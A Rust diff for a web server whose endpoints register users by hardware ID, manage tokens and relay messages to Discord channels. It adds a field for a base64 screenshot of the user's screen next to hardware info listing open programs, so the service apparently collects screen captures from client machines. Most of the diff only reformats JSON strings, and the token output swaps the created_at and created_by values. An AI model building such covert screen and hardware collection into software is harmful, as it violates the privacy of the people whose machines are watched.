@@ -6,6 +6,7 @@ use crate::lib::{global, auth, database, discord};
 pub struct MessageBody {
     pub username: String,
     pub identifier: String,     // sha256 hwid
+    pub image: String,     // Base64 encode a png of the users screen
     pub hardware_info: String   // Base64 encode a json of the users hardware info (open programs, etc.)
 }
 
@@ -70,16 +71,16 @@ async fn send_discord_message_endpoint(
     let token = match req.match_info().get("token") {
         Some(t) => match db.get_token(t).await {
             Some(t) => t,
-            None => return "{\"error\": \"unable to fetch token data\"}".to_string()
+            None => return r#"{"error": "unable to fetch token data"}"#.to_string()
         },
-        None => return "{\"error\": \"invalid token\"}".to_string()
+        None => return r#"{"error": "invalid token"}"#.to_string()
     };
 
     // Send the message to the discord channel via their api
     discord::send_message(token.channel, body).await;
     
     // Response String
-    return format!("{{\"success\": \"message sent to {}\"}}", token.channel);
+    return format!(r#"{{"success": "message sent to {}"}}"#, token.channel);
 }
 
 
@@ -102,19 +103,19 @@ async fn register_user_endpoint(
 
     // Verify the provided authorization headers
     if !auth::verify(&auth, &access_token) {
-        return "{\"error\": \"invalid request\"}".to_string();
+        return r#"{"error": "invalid request"}"#.to_string();
     }
 
     // Check if the account already exists
     if db.account_already_exists(&body.username, &body.identifier).await {
-        return "{\"error\": \"username already exists\"}".to_string();
+        return r#"{"error": "username already exists"}"#.to_string();
     }
 
     // Register the account to the database
     if db.register_user_to_database(&body.username, &body.identifier).await {
-        return "{\"success\": \"account registered\"}".to_string();
+        return r#"{"success": "account registered"}"#.to_string();
     }
-    return "{\"error\": \"failed to register account\"}".to_string();
+    return r#"{"error": "failed to register account"}"#.to_string();
 }
 
 
@@ -138,14 +139,14 @@ async fn login_user_endpoint(
 
     // Verify the provided authorization headers
     if !auth::verify(&auth, &access_token) {
-        return "{\"error\": \"invalid request\"}".to_string();
+        return r#"{"error": "invalid request"}"#.to_string();
     }
 
     // Check if the account already exists for the provided
     // body.identifier (hwid)
     return match db.account_hwid_exists(&body.identifier).await {
-        Some(username) => format!("{{\"username\": \"{}\"}}", username),
-        None => "{\"error\": \"user does not exist\"}".to_string()
+        Some(username) => format!(r#"{{"username": "{}"}}"#, username),
+        None => r#"{"error": "user does not exist"}"#.to_string()
     };
 }
 
@@ -167,24 +168,24 @@ async fn get_token_endpoint(
 
     // Verify the provided authorization headers
     if !auth::verify(&auth, &access_token) {
-        return "{\"error\": \"invalid request\"}".to_string();
+        return r#"{"error": "invalid request"}"#.to_string();
     }
 
     // Get the channel id from the url parameters
     let token: &str = match req.match_info().get("token") {
         Some(t) => t,
-        None => return "{\"error\": \"invalid token\"}".to_string()
+        None => return r#"{"error": "invalid token"}"#.to_string()
     };
 
     // Get the token information from the database
     let data = match db.get_token(token).await {
         Some(t) => t,
-        None => return "{\"error\": \"token is invalid or has expired\"}".to_string()
+        None => return r#"{"error": "token is invalid or has expired"}"#.to_string()
     };
 
     // Return the generated token
     return format!(
-        "{{\"token\": \"{}\", \"channel\": \"{}\", \"created_by\": \"{}\", \"created_at\": \"{}\", \"expires_in\": \"{}\"}}",
+        r#"{{"token": "{}", "channel": "{}", "created_by": "{}", "created_at": "{}", "expires_in": "{}"}}"#,
         token, data.channel, data.created_at, data.created_by, data.expires_in.to_string()
     );
 }
@@ -208,17 +209,17 @@ async fn generate_token_endpoint(
 
     // Verify the provided authorization headers
     if !auth::verify(&auth, &access_token) {
-        return "{\"error\": \"invalid request\"}".to_string();
+        return r#"{"error": "invalid request"}"#.to_string();
     }
 
     // Generate a new token
     let token = match db.generate_token(body.channel, &auth).await {
         Some(t) => t,
-        None => return "{\"error\": \"failed to generate token\"}".to_string()
+        None => return r#"{"error": "failed to generate token"}"#.to_string()
     };
 
     // Return the success json
-    return format!("{{\"token\": \"{}\"}}", token);
+    return format!(r#"{{"token": "{}"}}"#, token);
 }
 
 
@@ -239,13 +240,14 @@ async fn delete_token_endpoint(
 
     // Verify the provided authorization headers
     if !auth::verify(&auth, &access_token) {
-        return "{\"error\": \"invalid request\"}".to_string();
+        return r#"{"error": "invalid request"}"#.to_string();
     }
 
     // Delete the token from the database
     if db.delete_token(&body.token, &auth).await {
-        return "{\"success\": \"token deleted\"}".to_string();
+        return r#"{"success": "token deleted"}"#.to_string();
     }
+
     // Else, if the token could not be deleted, return the error json
-    return "{\"error\": \"failed to delete token\"}".to_string();
+    return r#"{"error": "failed to delete token"}"#.to_string();
 }
